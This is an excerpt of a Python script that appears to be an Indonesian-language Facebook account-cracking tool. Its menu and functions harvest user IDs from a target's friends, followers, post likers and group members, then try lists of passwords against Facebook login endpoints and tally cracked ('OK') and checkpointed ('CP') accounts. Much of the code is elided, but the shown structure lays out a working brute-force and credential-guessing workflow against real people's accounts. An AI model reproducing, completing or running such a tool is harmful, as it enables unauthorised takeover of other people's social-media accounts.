...
def banner():
	clear()
	wel='# WELCOME TO  TOOL COLI CINTO MANDI'
	cik2=mark(wel ,style='purple')
	sol().print(cik2)
	ban='''
``````########``````##``````########``````##````````````
``````##````##``````##``````##````````````##````````````
...
``````##````````````##``````########``````##````````````
                                         VERSISION :4.1.1       
'''
	oi = nel(tekz(ban,justify='center',style='bold'), style='purple')
	cetak(nel(oi, title='[bold cyan] • KENDAK KABA LA • [/bold cyan]'))
# VALIDASI TOKEN
def login():
		try:
			...
			try:
				...
				banner()
				li = '# JARINGAN KABA TU KARUT, ILUAK I KUDAI'
...
def menu(my_name,my_id):
	...
	sol().print(fx)
	print(k+'['+h+'•'+k+'] ACTIVE USER : '+str(my_name))
	print(k+'['+h+'•'+k+'] USER ID  TUMBAL   : '+str(my_id))
	print(k+'['+h+'•'+k+'] IP ADDRESS  : '+str(sh['origin']))
	io = '''[bold cyan][01] PUBLIC 	     [06] CRACK FROM FILES
[02] PUBLIC MASAL   [07] CHECK CHECKPOINT OPTIONS
[03] FOLLOWER		     [08] CHECK CRACK RESULTS
[04] LIKES THE POST	     [09] TIPS CRACK
[05] GROUP MEMBERS           [00] LOGOUT[bold purple]'''
	oi = nel(io, style='purple')
	cetak(nel(oi, title='[bold purple] • MENU CRACK • [/bold purple]'))
	...
	if ec in ['1','01']:
		...
		time.sleep(1)
		sw = '# SUCCESS OUT'
		sol().print(mark(sw, style='purple'))
		exit()
	else:
...
def result():
	...
	kis = nel(kayes, style='purple')
	cetak(nel(kis, title='RESULTS'))
	kz = input(k+'['+p+'f'+k+'] Choose : ')
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			sol().print(mark(akun, style='purple'))
			nocp=0
...
def file():
	...
	sol().print(mark(tek, style='purple'), style='on red')
	print(k+'['+k+'•'+k+'] READING THE FILE, WAIT A MINUTE •••')
	time.sleep(2)
	teks = '# SELECT FILES TO CHECK'
	sol().print(mark(teks, style='purple'))
	my_files = []
	try:
	...
	if len(my_files)==0:
		...
		sol().print(mark(teks2, style='purple'))
		geeh = input(k+'['+p+'f'+k+'] Choose : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
...
def dump_publik():
	...
	sol().print(win2)
	print(k+'['+h+'•'+k+'] TYPE "me" AMAW NDAK NGOCOK NGA KAWAN KABA')
	pil = input(k+'['+p+'f'+k+'] INPUT TARGET ID : ')
	try:
		...
		print(k+'['+h+'•'+k+'] TOTAL DUMP ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# SINYAL KABA TU KARUT, ILUAK I KUDAI'
		lo = mark(li, style='red')
		sol().print(lo, style='purple')
		exit()
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(k+'['+h+'•'+k+'] ENTER TOTAL ID LIMIT [20]')
		try:
			jum = int(input(k+'['+p+'f'+k+'] Number Of Id : '))
		except ValueError:
		...
		ses=requests.Session()
		yz = 0
		print(k+'['+h+'•'+k+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
		for met in range(jum):
			yz+=1
			kl = input(k+'['+h+str(yz)+k+'] Enter The '+str(yz)+'Id : ')
			uid.append(kl)
...
def dump_pengikut():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(k+'['+h+'•'+k+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FOLLOWERS')
	pil = input(k+'['+p+'f'+k+'] INPUT TARGET ID : ')
	try:
...
def setting():
	...
	if hu in ['1','01']:
		...
		sol().print(mark(ric, style='red'))
		exit()
	met = '# NDAK NGOCOK YAW MANAW'
	sol().print(mark(met, style='green'))
	ioz = '[01] NGOCOK M-FACEBOOK\n[02] NGOCOK FREE-FACEBOOK\n[03] NGOCOK TOUCH-FACEBOOK\n[04] NGOCOK MBASIC-FACEBOOK'
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s PNS %s/%s PNS OK:%s PNS CP:%s PNS %s%s%s PNS'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='PNS CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='PNS OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]PNS OK[/bold green]'))
					ok+=1
					break
